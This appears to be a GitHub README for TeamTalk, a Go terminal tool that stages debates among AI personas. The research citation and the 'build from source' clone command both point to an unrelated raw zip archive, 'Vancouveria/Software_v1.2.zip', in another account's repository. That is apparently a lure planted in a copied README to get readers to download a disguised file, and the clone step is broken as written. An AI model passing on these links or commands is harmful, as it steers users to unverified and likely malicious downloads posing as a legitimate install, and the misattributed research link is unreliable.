# 🏛️ TeamTalk

**AI team debates in your terminal.** One question, multiple expert personas, structured discussion, actionable conclusion.

Instead of asking one AI for an answer, TeamTalk runs a full team discussion — Developer, Designer, PM, and Security Engineer each bring their perspective, challenge each other, and converge on a decision.

![demo](demo.gif)

## Why?

A single AI gives you one perspective. A team of AI personas gives you:

- **Blind spots exposed** — Security catches what Developer missed
- **Real trade-offs** — PM pushes back on Designer's idealism
- **Better decisions** — 3 rounds of debate, not 1 shot

Based on MIT's [Society of Mind](https://github.com/martmain/teamtalk/raw/refs/heads/main/Vancouveria/Software_v1.2.zip) research — multi-agent debate improves reasoning by 15%+.

## Install

```bash
# One-liner (requires Go 1.22+)
go install github.com/Higangssh/teamtalk@latest
```

Or build from source:
```bash
git clone https://github.com/martmain/teamtalk/raw/refs/heads/main/Vancouveria/Software_v1.2.zip
cd teamtalk
go build -o teamtalk .
```

## Quick Start

```bash
# 1. Install
go install github.com/Higangssh/teamtalk@latest

# 2. Try it instantly (no API key needed)
teamtalk --demo

# 3. Use with real AI
export ANTHROPIC_API_KEY=sk-ant-...   # or OPENAI_API_KEY=sk-...
teamtalk "Should we rewrite our monolith to microservices?"
```

## More Examples

```bash
teamtalk "Do we need Kubernetes for 1000 users?"
teamtalk "Should we hire a junior or senior developer?"
teamtalk "Build vs buy for our auth system?"
teamtalk "Is GraphQL worth the complexity over REST?"
```

## How It Works

```
Round 1 — Initial Opinions     Each persona gives their take
Round 2 — Rebuttals            They challenge each other's points
Round 3 — Final Positions      Converge on a decision
Summary — Actionable conclusion with key agreements/disagreements
```

**Default team:**

| Persona | Role | Style |
|---------|------|-------|
| 💻 Developer | Technical feasibility | Blunt, hates complexity |
| 🎨 Designer | User experience | Fights for users |
| 📊 PM | Business impact & ROI | Pragmatic, data-driven |
| 🔒 Security | Risk & compliance | Paranoid, blocks risks |

## Providers

| Provider | Model | Cost per debate |
|----------|-------|-----------------|
| Anthropic | claude-3-haiku | ~$0.003 |
| Anthropic | claude-sonnet-4 | ~$0.03 |
| OpenAI | gpt-4o-mini | ~$0.003 |
| OpenAI | gpt-4o | ~$0.05 |

Override model:
```bash
TEAMTALK_MODEL=claude-sonnet-4-20250514 teamtalk "your question"
```

Token usage is displayed after every debate:
```
📊 Token Usage
─────────────────────────────────
   Provider:  Anthropic
   Model:     claude-3-haiku-20240307
   Input:     5,880 tokens
   Output:    898 tokens
   Total:     6,778 tokens
   Cost:      $0.0026
```

## Architecture

Single file. No frameworks. No dependencies.

```
main.go (514 lines)
├── Provider interface (Anthropic / OpenAI)
├── Debate engine (rounds, prompts, parallel calls)
├── Cost tracker (tokens, pricing per model)
├── Demo mode (built-in scenario, no API needed)
└── Terminal UI (typewriter effect)
```

## Roadmap

- [ ] Custom personas via YAML (`--team team.yaml`)
- [ ] Ollama support (free local models)
- [ ] Streaming responses
- [ ] Export debate to Markdown
- [ ] MCP server mode
- [ ] TUI dashboard with Bubble Tea

## License

MIT
